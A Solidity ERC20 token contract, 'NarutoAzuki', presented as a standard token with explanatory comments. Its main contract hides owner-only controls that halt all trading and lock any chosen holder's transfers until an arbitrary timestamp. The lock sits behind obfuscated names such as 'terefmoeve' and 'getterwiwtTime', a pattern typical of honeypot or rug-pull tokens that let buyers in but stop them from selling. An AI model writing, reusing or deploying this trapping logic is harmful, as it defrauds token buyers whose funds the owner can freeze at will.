pragma solidity ^0.8.0;

// IERC20 interface contains standard functions for ERC20 tokens
interface IERC20 {
    // Returns the total token supply.
    function totalSupply() external view returns (uint256);

    // Returns the token balance of a specific account.
    function balanceOf(address account) external view returns (uint256);

    // Transfers tokens to a specified address.
    function transfer(address recipient, uint256 amount) external returns (bool);

    // Returns the remaining number of tokens that spender is allowed to spend on behalf of owner.
    function allowance(address owner, address spender) external view returns (uint256);

    // Sets the amount of allowance the spender is allowed by the owner.
    function approve(address spender, uint256 amount) external returns (bool);

    // Transfers tokens from one address to another, using allowance mechanism.
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    // Emitted when tokens are transferred, including zero value transfers.
    event Transfer(address indexed from, address indexed to, uint256 value);

    // Emitted when the allowance of a spender for an owner is set by a call to approve.
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Context is an abstract contract that provides functionality for retrieving the sender of the transaction.
abstract contract Context {
    // Returns the address of the sender of the transaction.
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

// Ownable contract manages the ownership of the contract.
contract Ownable is Context {
    address private _owner;

    // Emitted when ownership is transferred.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // The constructor sets the original owner of the contract to the sender account.
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Returns the address of the current owner.
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Modifier to restrict functions to only the owner of the contract.
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Allows the current owner to relinquish control of the contract.
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Allows the current owner to transfer control of the contract to a newOwner.
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// Main contract implementing the ERC20 standard with additional features.
contract NarutoAzuki is Context, IERC20, Ownable {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _transferterefmoeve;
    bool private _tradingEnabled = true;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    // The constructor sets initial values for the token name, symbol, decimals, and total supply.
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** uint256(decimals_));
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Allows the owner to enable or disable trading.
    function setTradingEnabled(bool enabled) public onlyOwner {
        _tradingEnabled = enabled;
    }

    // Returns the current trading status.
    function isTradingEnabled() public view returns (bool) {
        return _tradingEnabled;
    }

    // Sets transfer terefmoeve for a specific account.
    function setTransferterefmoeve(address account, uint256 time) public onlyOwner {
        require(account != address(0), "Cannot set terefmoeve for the zero address");
        _transferterefmoeve[account] = time;
    }

    // Removes transfer terefmoeve for a specific account.
    function removeTransferterefmoeve(address account) public onlyOwner {
        require(account != address(0), "Cannot remove terefmoeve for the zero address");
        delete _transferterefmoeve[account];
    }

    // Returns the terefmoeve time for a specific account.
    function getterwiwtTime(address account) public view returns (uint256) {
        require(account != address(0), "Cannot query terefmoeve time for the zero address");
        return _transferterefmoeve[account];
    }

    // Returns the name of the token.
    function name() public view returns (string memory) {
        return _name;
    }

    // Returns the symbol of the token.
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    // Returns the number of decimals the token uses.
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    // Returns the total supply of tokens.
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    // Returns the balance of a specific account.
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    // Transfers tokens to a specified recipient.
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_tradingEnabled, "Trading is currently disabled");
        require(_balances[_msgSender()] >= amount, "Transfer amount exceeds balance");
        require(block.timestamp >= _transferterefmoeve[_msgSender()], "Transfer is currently restricted for this address");

        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    // Returns the allowance one address has over another.
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    // Sets the amount of tokens one address can use on behalf of another.
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    // Transfers tokens from one account to another, subject to allowance and balance.
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(_tradingEnabled, "Trading is currently disabled");
        require(_allowances[sender][_msgSender()] >= amount, "Transfer amount exceeds allowance");
        require(_balances[sender] >= amount, "Transfer amount exceeds balance");
        require(block.timestamp >= _transferterefmoeve[sender], "Transfer is currently restricted for this address");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
}